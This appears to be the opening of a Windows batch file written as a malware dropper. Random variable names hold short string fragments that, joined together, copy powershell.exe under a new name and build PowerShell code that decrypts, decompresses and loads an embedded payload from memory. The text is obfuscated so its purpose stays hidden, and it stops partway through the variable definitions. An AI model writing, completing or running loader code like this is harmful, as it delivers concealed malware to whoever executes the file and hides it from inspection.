@echo off
set "OfMPhoWVpy= C"
set "swYhoyyZKg=we"
set "PkEjmzBfIV=Sy"
set "bHyLNZkLOH=ll"
set "dHFpPRWyzs=ow"
set "ZtuWzOXFWF=in"
set "qRPEXwNNxm=\W"
set "tSwOOqkwmY=rS"
set "VxyxjcBNCW=we"
set "CPeVvaCUNe=co"
set "EVzOIKhUPU= /"
set "GDRSQDjmFU=py"
set "xJiXJBlIbQ=ws"
set "gzIFYfjyII=po"
set "lOnCKxcpOh=nd"
set "vvRICAeloa=st"
set "YcnXZUvZYA=xe"
set "xvJdqiQkKv=ll"
set "IxaYiOUDAW=he"
set "fRYfclggkL=rs"
set "ZxgfxcibOp=\v"
set "EOrZULtKaP=0\"
set "uWwOypxgpT=y "
set "mtaUJpBDCN=.e"
set "SEvZMeEIXS=s\"
set "oOHtsxKFQG=:\"
set "samYnHsnPG=em"
set "oCiybGTsMI=1."
set "SusWsTdvcq=32"
set "gnpccbdVqJ=do"
set "UFQDGzZvwE=Po"
set "hKAeSpzMrf=Wi"
set "CpDgKBxMwC=he"
set "PuBOrtBqom= %~dp0"
set "ggXEwhvYuL=cd"
set "HgAmPVXamT=$EBc"
set "MAJQXhCyVN=]::N"
set "cQWHckCGUp=('%*'"
set "HHgwdpOWeo==');"
set "xPpvZHttxO=.Mem"
set "ZGxyzKndNj=KymD"
set "iOiDrnpfmU=onve"
set "THaXMaPgMN=:: '"
set "gPXRWHRVSR=);$m"
set "PcChJdOgYf=yste"
set "VmGQRoWZRs=k; }"
set "kwSokaEaDh=]::("
set "vTArKGeDIb=ecry"
set "bgmNGihPrG=mD);"
set "pszSZTjVry=6] -"
set "AOQzKUgmtG=sKym"
set "dWxEgSlsvl=tS46"
set "XwWdvWLMRv=na.I"
set "KRAMmEfXeL=nHJO"
set "bFMHtbKNPF=sion"
set "oMfowjKKZu=S46e"
set "xYWsMvvoqu=form"
set "ocuBAubLYK=::('"
set "rLwsbpWFAA=..-1"
set "xLqpyTadzB=ptog"
